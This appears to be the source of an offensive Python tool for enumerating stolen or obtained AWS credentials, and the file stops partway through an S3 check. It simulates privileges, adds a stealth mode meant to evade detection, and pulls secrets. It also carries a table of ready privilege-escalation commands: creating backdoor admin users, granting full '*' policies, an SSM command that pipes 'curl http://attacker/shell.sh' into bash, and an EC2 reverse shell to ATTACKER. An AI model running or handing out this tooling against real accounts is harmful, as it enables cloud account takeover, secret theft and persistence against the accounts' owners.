#!/usr/bin/env python3
"""
aws_enum.py — AWS Credential Enumerator
Given AWS key:secret pairs, performs full identity, privilege, and
resource enumeration. Attempts to assume a configurable role across
a configurable list of AWS accounts.

Usage:
    python3 aws_enum.py -c KEY_ID:SECRET
    python3 aws_enum.py -f creds.txt
    python3 aws_enum.py -c KEY_ID:SECRET:SESSION_TOKEN --pull-secrets
    proxychains python3 aws_enum.py -f creds.txt -o /tmp/results.json

Input file format (one per line):
    AKIAXXXXXXXXXXXXXXXX:secretkeyhere
    AKIAXXXXXXXXXXXXXXXX:secretkeyhere:optionalsessiontoken
    # Comments and blank lines ignored

Author: d0s
"""

import boto3
import botocore
import argparse
import sys
import json
import os
from datetime import datetime, timezone
from botocore.config import Config

import urllib3
import random
import time as _time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def jitter(stealth=False, min_s=0.5, max_s=2.5):
    """Sleep a random amount if stealth mode is on"""
    if stealth:
        _time.sleep(random.uniform(min_s, max_s))

DEFAULT_ROLE_NAME = ""

PRIV_CHECKS = [
    # IAM
    "iam:GetUser", "iam:ListUsers", "iam:ListRoles", "iam:ListPolicies",
    "iam:ListAttachedUserPolicies", "iam:ListUserPolicies", "iam:GetUserPolicy",
    "iam:ListAttachedRolePolicies", "iam:ListRolePolicies", "iam:GetRolePolicy",
    "iam:SimulatePrincipalPolicy", "iam:CreateUser", "iam:CreateAccessKey",
    "iam:AttachUserPolicy", "iam:PutUserPolicy", "iam:CreateLoginProfile",
    "iam:UpdateLoginProfile", "iam:AddUserToGroup",
    "iam:AttachRolePolicy", "iam:PutRolePolicy", "iam:AttachGroupPolicy", "iam:PutGroupPolicy",
    "iam:CreatePolicyVersion", "iam:SetDefaultPolicyVersion",
    "iam:PassRole", "iam:UpdateAssumeRolePolicy", "iam:CreateRole",
    # STS
    "sts:AssumeRole", "sts:GetFederationToken", "sts:GetSessionToken",
    # S3
    "s3:ListAllMyBuckets", "s3:GetObject", "s3:PutObject",
    "s3:DeleteObject", "s3:GetBucketPolicy", "s3:PutBucketPolicy",
    # EC2
    "ec2:DescribeInstances", "ec2:DescribeSecurityGroups",
    "ec2:DescribeVpcs", "ec2:RunInstances", "ec2:DescribeImages",
    # EKS
    "eks:ListClusters", "eks:DescribeCluster", "eks:CreateCluster", "eks:DeleteCluster",
    # ECR
    "ecr:DescribeRepositories", "ecr:GetAuthorizationToken", "ecr:BatchGetImage",
    "ecr:PutImage",
    # Lambda
    "lambda:ListFunctions", "lambda:InvokeFunction", "lambda:UpdateFunctionCode",
    "lambda:CreateFunction", "lambda:AddPermission", "lambda:CreateEventSourceMapping",
    "lambda:UpdateFunctionConfiguration",
    # SSM
    "ssm:DescribeInstanceInformation", "ssm:SendCommand",
    "ssm:GetParameter", "ssm:GetParameters", "ssm:DescribeParameters",
    "ssm:PutParameter", "ssm:DeleteParameter", "ssm:StartSession",
    # Secrets Manager
    "secretsmanager:ListSecrets", "secretsmanager:GetSecretValue",
    "secretsmanager:PutSecretValue", "secretsmanager:CreateSecret",
    # RDS
    "rds:DescribeDBInstances", "rds:DescribeDBClusters",
    # DynamoDB
    "dynamodb:ListTables", "dynamodb:Scan", "dynamodb:GetItem",
    # CloudFormation
    "cloudformation:ListStacks", "cloudformation:GetTemplate",
    "cloudformation:CreateStack", "cloudformation:UpdateStack",
    # Organizations
    "organizations:DescribeOrganization", "organizations:ListAccounts",
    # Logs
    "logs:DescribeLogGroups", "logs:FilterLogEvents",
    # CodeBuild
    "codebuild:CreateProject", "codebuild:StartBuild",
    # Glue
    "glue:CreateDevEndpoint", "glue:UpdateDevEndpoint",
    # SageMaker
    "sagemaker:CreateNotebookInstance", "sagemaker:CreateProcessingJob",
    # DataPipeline
    "datapipeline:CreatePipeline", "datapipeline:PutPipelineDefinition",
    # ECS
    "ecs:RegisterTaskDefinition", "ecs:RunTask", "ecs:CreateService",
    # CodeStar
    "codestar:CreateProject",
    # STS
    "sts:GetCallerIdentity",
]


# ── Privilege Escalation Paths ────────────────────────────────────────────────

PRIVESC_PATHS = [
    # ── Direct IAM Manipulation ───────────────────────────────────────────
    {
        "id": "iam-create-access-key",
        "name": "Create access key for another user",
        "risk": "CRITICAL",
        "requires": ["iam:CreateAccessKey"],
        "requires_any": [],
        "description": "Create new access keys for any IAM user, including admins.",
        "exploit": "aws iam create-access-key --user-name <admin-user>",
    },
    {
        "id": "iam-create-login-profile",
        "name": "Create/update console password for another user",
        "risk": "CRITICAL",
        "requires": [],
        "requires_any": ["iam:CreateLoginProfile", "iam:UpdateLoginProfile"],
        "description": "Set a console password for any IAM user to log in as them.",
        "exploit": "aws iam create-login-profile --user-name <admin-user> --password <pass>",
    },
    {
        "id": "iam-attach-admin-policy",
        "name": "Attach admin policy to self/user",
        "risk": "CRITICAL",
        "requires": ["iam:AttachUserPolicy"],
        "requires_any": [],
        "description": "Attach AdministratorAccess or any managed policy to a user.",
        "exploit": "aws iam attach-user-policy --user-name <self> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
    },
    {
        "id": "iam-put-user-policy",
        "name": "Add inline admin policy to user",
        "risk": "CRITICAL",
        "requires": ["iam:PutUserPolicy"],
        "requires_any": [],
        "description": "Write an inline policy granting full admin to any user.",
        "exploit": 'aws iam put-user-policy --user-name <self> --policy-name escalate --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\'',
    },
    {
        "id": "iam-attach-role-policy",
        "name": "Attach admin policy to role",
        "risk": "CRITICAL",
        "requires": ["iam:AttachRolePolicy"],
        "requires_any": [],
        "description": "Attach AdministratorAccess to any role, then assume it.",
        "exploit": "aws iam attach-role-policy --role-name <role> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
    },
    {
        "id": "iam-put-role-policy",
        "name": "Add inline admin policy to role",
        "risk": "CRITICAL",
        "requires": ["iam:PutRolePolicy"],
        "requires_any": [],
        "description": "Write an inline policy granting full admin to any role.",
        "exploit": "aws iam put-role-policy --role-name <role> --policy-name escalate --policy-document '{...}'",
    },
    {
        "id": "iam-attach-group-policy",
        "name": "Attach admin policy to group",
        "risk": "CRITICAL",
        "requires": ["iam:AttachGroupPolicy"],
        "requires_any": [],
        "description": "Attach AdministratorAccess to a group you belong to.",
        "exploit": "aws iam attach-group-policy --group-name <group> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
    },
    {
        "id": "iam-put-group-policy",
        "name": "Add inline admin policy to group",
        "risk": "CRITICAL",
        "requires": ["iam:PutGroupPolicy"],
        "requires_any": [],
        "description": "Write an inline policy granting full admin to a group you belong to.",
        "exploit": "aws iam put-group-policy --group-name <group> --policy-name escalate --policy-document '{...}'",
    },
    {
        "id": "iam-create-policy-version",
        "name": "Create new policy version with admin access",
        "risk": "CRITICAL",
        "requires": ["iam:CreatePolicyVersion"],
        "requires_any": [],
        "description": "Create a new version of an existing managed policy with full admin permissions and set it as default.",
        "exploit": "aws iam create-policy-version --policy-arn <policy-arn> --policy-document '{...}' --set-as-default",
    },
    {
        "id": "iam-set-default-policy-version",
        "name": "Activate a permissive older policy version",
        "risk": "HIGH",
        "requires": ["iam:SetDefaultPolicyVersion"],
        "requires_any": [],
        "description": "Switch the active version of a managed policy to an older, more permissive version.",
        "exploit": "aws iam set-default-policy-version --policy-arn <arn> --version-id v1",
    },
    {
        "id": "iam-add-user-to-group",
        "name": "Add self to admin group",
        "risk": "CRITICAL",
        "requires": ["iam:AddUserToGroup"],
        "requires_any": [],
        "description": "Add your user to a group with admin or elevated policies.",
        "exploit": "aws iam add-user-to-group --group-name admins --user-name <self>",
    },
    {
        "id": "iam-update-assume-role-policy",
        "name": "Modify role trust policy to allow self-assumption",
        "risk": "CRITICAL",
        "requires": ["iam:UpdateAssumeRolePolicy"],
        "requires_any": [],
        "description": "Update a role's trust policy to allow your user/role to assume it.",
        "exploit": "aws iam update-assume-role-policy --role-name <admin-role> --policy-document '{...self as principal...}'",
    },
    {
        "id": "iam-create-user-full",
        "name": "Create new IAM user with admin access",
        "risk": "CRITICAL",
        "requires": ["iam:CreateUser", "iam:CreateAccessKey"],
        "requires_any": ["iam:AttachUserPolicy", "iam:PutUserPolicy", "iam:AddUserToGroup"],
        "description": "Create a new IAM user, attach admin policy, and generate access keys.",
        "exploit": "aws iam create-user --user-name backdoor && aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && aws iam create-access-key --user-name backdoor",
    },

    # ── PassRole + Service Exploitation ───────────────────────────────────
    {
        "id": "passrole-lambda",
        "name": "PassRole + Lambda code execution",
        "risk": "CRITICAL",
        "requires": ["iam:PassRole"],
        "requires_any": ["lambda:CreateFunction", "lambda:UpdateFunctionCode"],
        "description": "Pass a privileged role to a Lambda function and execute code as that role. "
                       "Can also update existing function code to hijack its role.",
        "exploit": "aws lambda create-function --function-name pwn --role <admin-role-arn> --runtime python3.12 --handler lambda_function.handler --zip-file fileb://payload.zip",
    },
    {
        "id": "passrole-ec2",
        "name": "PassRole + EC2 instance with privileged profile",
        "risk": "CRITICAL",
        "requires": ["iam:PassRole", "ec2:RunInstances"],
        "requires_any": [],
        "description": "Launch an EC2 instance with a privileged instance profile. "
                       "Access the instance metadata service to get temporary credentials.",
        "exploit": "aws ec2 run-instances --image-id <ami> --instance-type t3.micro --iam-instance-profile Name=<admin-profile> --user-data '#!/bin/bash\\ncurl http://169.254.169.254/latest/meta-data/iam/...'",
    },
    {
        "id": "passrole-cloudformation",
        "name": "PassRole + CloudFormation stack",
        "risk": "CRITICAL",
        "requires": ["iam:PassRole", "cloudformation:CreateStack"],
        "requires_any": [],
        "description": "Create a CloudFormation stack with a privileged service role. "
                       "The stack executes with the role's permissions.",
        "exploit": "aws cloudformation create-stack --stack-name pwn --template-body file://template.yml --role-arn <admin-role-arn>",
    },
    {
        "id": "passrole-glue",
        "name": "PassRole + Glue dev endpoint",
        "risk": "HIGH",
        "requires": ["iam:PassRole", "glue:CreateDevEndpoint"],
        "requires_any": [],
        "description": "Create a Glue dev endpoint with a privileged role and SSH into it.",
        "exploit": "aws glue create-dev-endpoint --endpoint-name pwn --role-arn <admin-role-arn> --public-key file://key.pub",
    },
    {
        "id": "passrole-codebuild",
        "name": "PassRole + CodeBuild project",
        "risk": "HIGH",
        "requires": ["iam:PassRole", "codebuild:CreateProject"],
        "requires_any": [],
        "description": "Create a CodeBuild project with a privileged service role. "
                       "Buildspec commands run as that role.",
        "exploit": "aws codebuild create-project --name pwn --service-role <admin-role-arn> --source type=NO_SOURCE --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL",
    },
    {
        "id": "passrole-sagemaker",
        "name": "PassRole + SageMaker notebook",
        "risk": "HIGH",
        "requires": ["iam:PassRole", "sagemaker:CreateNotebookInstance"],
        "requires_any": [],
        "description": "Create a SageMaker notebook instance with a privileged role for code execution.",
        "exploit": "aws sagemaker create-notebook-instance --notebook-instance-name pwn --role-arn <admin-role-arn> --instance-type ml.t3.medium",
    },
    {
        "id": "passrole-datapipeline",
        "name": "PassRole + Data Pipeline",
        "risk": "HIGH",
        "requires": ["iam:PassRole", "datapipeline:CreatePipeline"],
        "requires_any": [],
        "description": "Create a Data Pipeline with a privileged role for arbitrary command execution.",
        "exploit": "aws datapipeline create-pipeline --name pwn --unique-id pwn",
    },
    {
        "id": "passrole-ecs",
        "name": "PassRole + ECS task execution",
        "risk": "CRITICAL",
        "requires": ["iam:PassRole", "ecs:RegisterTaskDefinition"],
        "requires_any": ["ecs:RunTask", "ecs:CreateService"],
        "description": "Register an ECS task definition with a privileged role and run it.",
        "exploit": "aws ecs register-task-definition --family pwn --task-role-arn <admin-role-arn> --container-definitions '[...]' && aws ecs run-task --task-definition pwn --cluster <cluster>",
    },

    # ── Direct Service Exploitation ───────────────────────────────────────
    {
        "id": "lambda-update-code",
        "name": "Update existing Lambda function code",
        "risk": "CRITICAL",
        "requires": ["lambda:UpdateFunctionCode"],
        "requires_any": [],
        "description": "Overwrite an existing Lambda function's code to execute as its role. "
                       "No PassRole needed — hijacks the function's existing role.",
        "exploit": "aws lambda update-function-code --function-name <target-fn> --zip-file fileb://payload.zip",
    },
    {
        "id": "lambda-update-config-layer",
        "name": "Add malicious Lambda layer",
        "risk": "HIGH",
        "requires": ["lambda:UpdateFunctionConfiguration"],
        "requires_any": [],
        "description": "Add a Lambda layer containing malicious code to an existing function.",
        "exploit": "aws lambda update-function-configuration --function-name <fn> --layers <malicious-layer-arn>",
    },
    {
        "id": "lambda-event-source",
        "name": "Create Lambda event source mapping",
        "risk": "HIGH",
        "requires": ["lambda:CreateEventSourceMapping"],
        "requires_any": [],
        "description": "Map an event source (SQS, DynamoDB, Kinesis) to a Lambda to trigger execution.",
        "exploit": "aws lambda create-event-source-mapping --function-name <fn> --event-source-arn <source-arn>",
    },
    {
        "id": "ssm-send-command",
        "name": "SSM SendCommand RCE on managed instances",
        "risk": "CRITICAL",
        "requires": ["ssm:SendCommand"],
        "requires_any": [],
        "description": "Execute arbitrary commands on SSM-managed EC2 instances. "
                       "Inherits the instance profile role.",
        "exploit": "aws ssm send-command --instance-ids <id> --document-name AWS-RunShellScript --parameters commands='curl http://attacker/shell.sh|bash'",
    },
    {
        "id": "ssm-start-session",
        "name": "SSM StartSession interactive shell",
        "risk": "CRITICAL",
        "requires": ["ssm:StartSession"],
        "requires_any": [],
        "description": "Open an interactive shell session on SSM-managed instances.",
        "exploit": "aws ssm start-session --target <instance-id>",
    },
    {
        "id": "ec2-userdata",
        "name": "Launch EC2 with reverse shell in user-data",
        "risk": "HIGH",
        "requires": ["ec2:RunInstances"],
        "requires_any": [],
        "description": "Launch an EC2 instance with a reverse shell in user-data. "
                       "If the instance has an IAM profile, steal those credentials.",
        "exploit": "aws ec2 run-instances --image-id <ami> --instance-type t3.micro --user-data '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER/443 0>&1'",
    },
    {
        "id": "codestar-backdoor",
        "name": "CodeStar project creates admin role",
        "risk": "HIGH",
        "requires": ["codestar:CreateProject"],
        "requires_any": [],
        "description": "Creating a CodeStar project auto-creates IAM roles with elevated permissions.",
        "exploit": "aws codestar create-project --name pwn --id pwn",
    },
    {
        "id": "cloudformation-update",
        "name": "Update CloudFormation stack with malicious template",
        "risk": "HIGH",
        "requires": ["cloudformation:UpdateStack"],
        "requires_any": [],
        "description": "Update an existing stack's template to create backdoor resources using the stack's service role.",
        "exploit": "aws cloudformation update-stack --stack-name <stack> --template-body file://backdoor.yml",
    },

    # ── Credential/Secret Access ──────────────────────────────────────────
    {
        "id": "secrets-manager-read",
        "name": "Read secrets from Secrets Manager",
        "risk": "HIGH",
        "requires": ["secretsmanager:GetSecretValue"],
        "requires_any": [],
        "description": "Read secret values which may contain database passwords, API keys, or other credentials for lateral movement.",
        "exploit": "aws secretsmanager get-secret-value --secret-id <name>",
    },
    {
        "id": "ssm-param-read",
        "name": "Read SSM SecureString parameters",
        "risk": "HIGH",
        "requires": ["ssm:GetParameter"],
        "requires_any": [],
        "description": "Read SSM parameters including SecureStrings (encrypted values) which may contain credentials.",
        "exploit": "aws ssm get-parameter --name <name> --with-decryption",
    },
    {
        "id": "s3-bucket-policy",
        "name": "Modify S3 bucket policy for exfil/persistence",
        "risk": "HIGH",
        "requires": ["s3:PutBucketPolicy"],
        "requires_any": [],
        "description": "Modify bucket policies to grant external access or exfiltrate data.",
        "exploit": "aws s3api put-bucket-policy --bucket <bucket> --policy '{...allow external principal...}'",
    },
    {
        "id": "ecr-push-image",
        "name": "Push malicious container image to ECR",
        "risk": "HIGH",
        "requires": ["ecr:PutImage"],
        "requires_any": [],
        "description": "Push a backdoored container image to ECR for supply chain compromise. "
                       "Containers using this repo will pull the malicious image.",
        "exploit": "docker push <account>.dkr.ecr.<region>.amazonaws.com/<repo>:latest",
    },

    # ── Cross-Account / Org ───────────────────────────────────────────────
    {
        "id": "sts-assume-role",
        "name": "Assume roles (cross-account pivot)",
        "risk": "HIGH",
        "requires": ["sts:AssumeRole"],
        "requires_any": [],
        "description": "Assume roles in same or other accounts. Check visible roles for assumable targets.",
        "exploit": "aws sts assume-role --role-arn arn:aws:iam::<account>:role/<role> --role-session-name pwn",
    },
    {
        "id": "sts-federation",
        "name": "Get federation token for console access",
        "risk": "MEDIUM",
        "requires": ["sts:GetFederationToken"],
        "requires_any": [],
        "description": "Generate a federation token to access the AWS console via URL.",
        "exploit": "aws sts get-federation-token --name console-user --policy '{...}'",
    },
    {
        "id": "iam-create-role-assume",
        "name": "Create new role with self-trust and admin policy",
        "risk": "CRITICAL",
        "requires": ["iam:CreateRole"],
        "requires_any": ["iam:AttachRolePolicy", "iam:PutRolePolicy"],
        "description": "Create a new role trusting your own principal, attach admin policy, then assume it.",
        "exploit": "aws iam create-role --role-name backdoor --assume-role-policy-document '{...self trust...}' && aws iam attach-role-policy --role-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && aws sts assume-role --role-arn <new-role-arn> --role-session-name pwn",
    },
]


def check_privesc_paths(allowed_actions, identity, iam_data):
    """
    Evaluate known privilege escalation paths against the allowed actions.
    Returns list of viable paths with risk level and exploitation details.
    """
    if not allowed_actions:
        return []

    allowed_set = set(allowed_actions)
    viable = []

    for path in PRIVESC_PATHS:
        # Check all required actions are allowed
        has_required = all(a in allowed_set for a in path["requires"])
        if not has_required:
            continue

        # Check at least one of requires_any (if specified)
        if path["requires_any"]:
            has_any = any(a in allowed_set for a in path["requires_any"])
            if not has_any:
                continue

        # Build the matched actions list
        matched = list(path["requires"])
        for a in path["requires_any"]:
            if a in allowed_set:
                matched.append(a)

        entry = {
            "id": path["id"],
            "name": path["name"],
            "risk": path["risk"],
            "matched_actions": matched,
            "description": path["description"],
            "exploit": path["exploit"],
        }

        # Enrich with context from IAM data
        if "iam:CreateAccessKey" in matched and iam_data.get("visible_users"):
            entry["targets"] = iam_data["visible_users"][:10]
        if "sts:AssumeRole" in matched and iam_data.get("visible_roles"):
            entry["assumable_roles"] = iam_data["visible_roles"][:10]
        if "iam:AddUserToGroup" in matched and iam_data.get("groups"):
            entry["current_groups"] = iam_data["groups"]

        viable.append(entry)

    # Sort by risk: CRITICAL > HIGH > MEDIUM
    risk_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}
    viable.sort(key=lambda x: risk_order.get(x["risk"], 3))

    return viable

ALL_REGIONS = [
    "us-east-1", "us-east-2", "us-west-1", "us-west-2",
    "eu-west-1", "eu-west-2", "eu-central-1", "eu-central-2",
    "ap-southeast-1", "ap-southeast-2", "ap-northeast-1",
    "sa-east-1", "ca-central-1", "af-south-1",
]

DEFAULT_REGIONS = ["us-east-1", "us-east-2", "us-west-2", "eu-central-1", "ap-southeast-1"]

# AWS China partition
CN_ALL_REGIONS = ["cn-north-1", "cn-northwest-1"]
CN_DEFAULT_REGIONS = ["cn-north-1", "cn-northwest-1"]


def detect_partition(arn):
    """Detect AWS partition from ARN. Returns 'aws-cn' for China, 'aws' otherwise."""
    if arn and ":aws-cn:" in arn:
        return "aws-cn"
    return "aws"


def arn_prefix(partition):
    """Return ARN prefix for partition."""
    return f"arn:{partition}"


def regions_for_partition(partition, all_regions=False):
    """Return region lists appropriate for the partition."""
    if partition == "aws-cn":
        return CN_ALL_REGIONS if all_regions else CN_DEFAULT_REGIONS
    return ALL_REGIONS if all_regions else DEFAULT_REGIONS


def org_region(partition):
    """Organizations API endpoint region per partition."""
    return "cn-northwest-1" if partition == "aws-cn" else "us-east-1"


def ts():
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC --")


def banner():
    print("""
\033[38;5;118m\033[1m  ╔════════════════════════════════════════════════════════════════════════╗
  ║  ██████  ██   ██  ██████       ███████ ███    ██ ██    ██ ███    ███  ║
  ║ ██    ██ ██   ██ ██            ██      ████   ██ ██    ██ ████  ████  ║
  ║ ████████ ██ █ ██  █████  ████  █████   ██ ██  ██ ██    ██ ██ ████ ██  ║
  ║ ██    ██ ██████       ██       ██      ██  ██ ██ ██    ██ ██  ██  ██  ║
  ║ ██    ██  ████   ██████        ███████ ██   ████  ██████  ██      ██  ║
  ║\033[0m\033[38;5;135m  AWS Credential Enumerator  //  red team use only                     \033[38;5;118m\033[1m║
  ╚════════════════════════════════════════════════════════════════════════╝\033[0m
""")


def parse_args():
    parser = argparse.ArgumentParser(
        description="AWS credential enumerator with priv checks and role assumption",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Single credential:
    python3 aws_enum.py -c AKIAXXXXXXXX:secretkey

  With session token:
    python3 aws_enum.py -c AKIAXXXXXXXX:secretkey:sessiontoken

  From file:
    python3 aws_enum.py -f creds.txt

  Pull actual SSM/SM secret values (default: names only):
    python3 aws_enum.py -f creds.txt --pull-secrets

  Try role in specific accounts:
    python3 aws_enum.py -f creds.txt --accounts 123456789012,987654321098

  Accounts with aliases:
    python3 aws_enum.py -f creds.txt --accounts 123456789012:prod,987654321098:staging

  Load accounts from file (ID or ID:alias per line):
    python3 aws_enum.py -f creds.txt --accounts-file accounts.txt

  Custom role name:
    python3 aws_enum.py -f creds.txt --role-name my-admin-role

  Scan all AWS regions for EKS:
    python3 aws_enum.py -f creds.txt --all-regions

  Skip role assumption:
    python3 aws_enum.py -f creds.txt --no-assume

  Fast mode (skip priv simulation):
    python3 aws_enum.py -f creds.txt --fast

  With proxychains:
    proxychains python3 aws_enum.py -f creds.txt -o /tmp/results.json
        """
    )

    inp = parser.add_argument_group("Input")
    inp.add_argument("-c", "--cred",
                     help="Single credential: KEY_ID:SECRET or KEY_ID:SECRET:TOKEN")
    inp.add_argument("-f", "--file",
                     help="File with credentials, one per line (KEY:SECRET[:TOKEN])")
    inp.add_argument("--profile",
                     help="AWS CLI profile name (reads from ~/.aws/credentials)")
    inp.add_argument("-a", "--all", action="store_true",
                     help="Run all credentials from file without interactive selection")

    opts = parser.add_argument_group("Options")
    opts.add_argument("-r", "--region", default="us-east-1",
                      help="Anchor region for STS/role assumption calls (default: us-east-1). "
                           "All resource checks (EKS, SSM, SM, ECR, RDS, Lambda, EC2) run across all regions regardless.")
    opts.add_argument("--all-regions", action="store_true",
                      help="Check all AWS regions for EKS/ECR (slower)")
    opts.add_argument("--fast", action="store_true",
                      help="Skip IAM privilege simulation")
    opts.add_argument("--stealth", action="store_true",
                      help="Stealth mode — skips noisy checks (simulate_principal_policy, "
                           "SendCommand test, cross-account role attempts), adds random jitter "
                           "between API calls (0.5-2.5s). Slower but quieter.")
    opts.add_argument("--timeout", type=int, default=10,
                      help="Request timeout in seconds (default: 10)")

    assume = parser.add_argument_group("Role Assumption")
    assume.add_argument("--no-assume", action="store_true",
                        help="Skip role assumption entirely")
    assume.add_argument("--role-name", default=DEFAULT_ROLE_NAME,
                        help="Role name to attempt assumption (required for role assumption)")
    assume.add_argument("--accounts",
                        help="Comma-separated account IDs (or ID:alias) to try role assumption in. "
                             "Always includes own account. "
                             "Example: 123456789012,987654321098:staging")
    assume.add_argument("--accounts-file",
                        help="File with account IDs, one per line (ID or ID:alias)")

    secrets = parser.add_argument_group("Secrets")
    secrets.add_argument("--pull-secrets", action="store_true",
                         help="Pull actual secret values from SSM and Secrets Manager "
                              "(default: list names only, no values)")
    secrets.add_argument("--pull-secrets-only", action="store_true",
                         help="Skip all enumeration — only pull SSM params and SM secrets across all regions")

    out = parser.add_argument_group("Output")
    out.add_argument("-o", "--output",
                     nargs="?", const="__auto__",
                     help="Save full JSON results to this path. "
                          "Use -o alone to auto-name as <out-dir>/<key_id>.json (default behavior)")
    out.add_argument("--out-dir", default=None,
                     help="Output directory (default: ./aws_enum_<timestamp> in CWD)")

    args = parser.parse_args()

    if not args.cred and not args.file and not args.profile:
        parser.error("Provide --cred, --file, or --profile")

    return args


def load_accounts(args):
    accounts = {}

    if args.accounts:
        for entry in args.accounts.split(","):
            entry = entry.strip()
            if ":" in entry:
                account_id, alias = entry.split(":", 1)
            else:
                account_id, alias = entry, entry
            accounts[account_id.strip()] = alias.strip()

    if getattr(args, "accounts_file", None) and os.path.exists(args.accounts_file):
        with open(args.accounts_file) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" in line:
                    account_id, alias = line.split(":", 1)
                else:
                    account_id, alias = line, line
                accounts[account_id.strip()] = alias.strip()

    return accounts


def make_client(service, key_id, secret, token=None, region="us-east-1", timeout=10):
    config = Config(
        connect_timeout=timeout,
        read_timeout=timeout,
        retries={"max_attempts": 1}
    )
    kwargs = dict(
        service_name=service,
        region_name=region,
        aws_access_key_id=key_id,
        aws_secret_access_key=secret,
        config=config
    )
    if token:
        kwargs["aws_session_token"] = token
    return boto3.client(**kwargs)


def safe(func, *args, **kwargs):
    try:
        return func(*args, **kwargs), None
    except botocore.exceptions.ClientError as e:
        return None, e.response["Error"]["Code"]
    except Exception as e:
        return None, f"{type(e).__name__}: {e}"


# ─── Checks ───────────────────────────────────────────────────────────────────

def check_identity(key_id, secret, token, region, timeout):
    client = make_client("sts", key_id, secret, token, region, timeout)
    result, err = safe(client.get_caller_identity)
    if err:
        # China keys fail against standard endpoints — retry cn-northwest-1
        if err in ("InvalidClientTokenId", "SignatureDoesNotMatch") and not region.startswith("cn-"):
            client = make_client("sts", key_id, secret, token, "cn-northwest-1", timeout)
            result, err = safe(client.get_caller_identity)
            if err:
                return None, err
        else:
            return None, err

    # Get account alias — use cn-northwest-1 for China ARNs
    iam_region = "cn-northwest-1" if ":aws-cn:" in result["Arn"] else region
    iam = make_client("iam", key_id, secret, token, iam_region, timeout)
    aliases, _ = safe(iam.list_account_aliases)
    alias = aliases["AccountAliases"][0] if aliases and aliases.get("AccountAliases") else None

    return {
        "user_id": result["UserId"],
        "account": result["Account"],
        "account_alias": alias,
        "arn": result["Arn"],
        "key_type": "ASIA (temporary/role)" if key_id.startswith("ASIA") else "AKIA (long-term/user)",
        "is_role": ":assumed-role/" in result["Arn"],
        "is_root": ":root" in result["Arn"],
    }, None


def check_iam(key_id, secret, token, region, timeout, identity):
    client = make_client("iam", key_id, secret, token, region, timeout)
    result = {}

    arn = identity["arn"]
    username = arn.split("/")[-1] if "/" in arn and not identity.get("is_role") else None

    if not identity.get("is_role") and username:
        user, _ = safe(client.get_user, UserName=username)
        if user:
            u = user["User"]
            result["username"] = u.get("UserName")
            result["created"] = str(u.get("CreateDate", ""))
            result["password_last_used"] = str(u.get("PasswordLastUsed", "Never"))
            result["tags"] = u.get("Tags", [])

        for call, key in [
            (lambda: safe(client.list_attached_user_policies, UserName=username), "attached_policies"),
            (lambda: safe(client.list_user_policies, UserName=username), "inline_policies"),
            (lambda: safe(client.list_groups_for_user, UserName=username), "groups"),
            (lambda: safe(client.list_access_keys, UserName=username), "access_keys"),
        ]:
            res, _ = call()
            if res:
                if key == "attached_policies":
                    result[key] = [p["PolicyName"] for p in res.get("AttachedPolicies", [])]
                elif key == "inline_policies":
                    result[key] = res.get("PolicyNames", [])
                elif key == "groups":
                    result[key] = [g["GroupName"] for g in res.get("Groups", [])]
                elif key == "access_keys":
                    result[key] = [
                        {"key_id": k["AccessKeyId"], "status": k["Status"],
                         "created": str(k["CreateDate"])}
                        for k in res.get("AccessKeyMetadata", [])
                    ]

    roles, _ = safe(client.list_roles, MaxItems=100)
    if roles:
        result["visible_roles"] = [r["RoleName"] for r in roles.get("Roles", [])]

    users, _ = safe(client.list_users, MaxItems=100)
    if users:
        result["visible_users"] = [u["UserName"] for u in users.get("Users", [])]

    return result


def check_privs(key_id, secret, token, region, timeout, identity):
    if identity.get("is_root"):
        return {"note": "Root — all actions allowed"}
    client = make_client("iam", key_id, secret, token, region, timeout)
    result, err = safe(
        client.simulate_principal_policy,
        PolicySourceArn=identity["arn"],
        ActionNames=PRIV_CHECKS
    )
    if err:
        return {"error": err}

    allowed, denied = [], []
    for r in result.get("EvaluationResults", []):
        (allowed if r["EvalDecision"] == "allowed" else denied).append(r["EvalActionName"])

    high_value = [a for a in allowed if any(h in a for h in [
        "iam:Create", "iam:Put", "iam:Attach", "iam:PassRole", "iam:Update",
        "sts:AssumeRole", "s3:PutBucketPolicy", "ec2:RunInstances",
        "lambda:UpdateFunctionCode", "lambda:Invoke",
        "ssm:SendCommand", "ssm:PutParameter",
        "secretsmanager:GetSecretValue", "secretsmanager:PutSecretValue",
        "eks:Create", "eks:Delete", "organizations:ListAccounts",
    ])]

    return {"allowed": allowed, "denied_count": len(denied), "high_value": high_value}


def check_s3(key_id, secret, token, region, timeout):
    client = make_client("s3", key_id, secret, token, region, timeout)
    result, err = safe(client.list_buckets)
    if err:
        return {"error": err}
    names = [b["Name"] for b in result.get("Buckets", [])]

    # Categorize by name
    s3_result = {
        "total": len(names),
        "terraform_buckets": [b for b in names if "terraform" in b.lower()],
        "backup_buckets": [b for b in names if any(kw in b.lower()
                           for kw in ["backup", "velero", "snapshot"])],
        "log_buckets": [b for b in names if any(kw in b.lower()
                        for kw in ["log", "audit", "access"])],
        "secret_buckets": [b for b in names if any(kw in b.lower()
                           for kw in ["secret", "credential", "key", "vault", "password", "token"])],
        "cicd_buckets": [b for b in names if any(kw in b.lower()
                         for kw in ["deploy", "artifact", "pipeline", "codebuild", "codepipeline"])],
        "all": names,
        "public": [],
        "policy_writable": [],
        "versioning_disabled": [],
    }

    # Deeper enumeration per bucket (read-only, stealthy)
    for bname in names:
        # Check public access — GetBucketPolicyStatus is a lightweight read-only call
        pol_status, _ = safe(client.get_bucket_policy_status, Bucket=bname)
        if pol_status and pol_status.get("PolicyStatus", {}).get("IsPublic"):
            s3_result["public"].append(bname)

        # Check bucket policy for write access from external principals
        policy, _ = safe(client.get_bucket_policy, Bucket=bname)
        if policy:
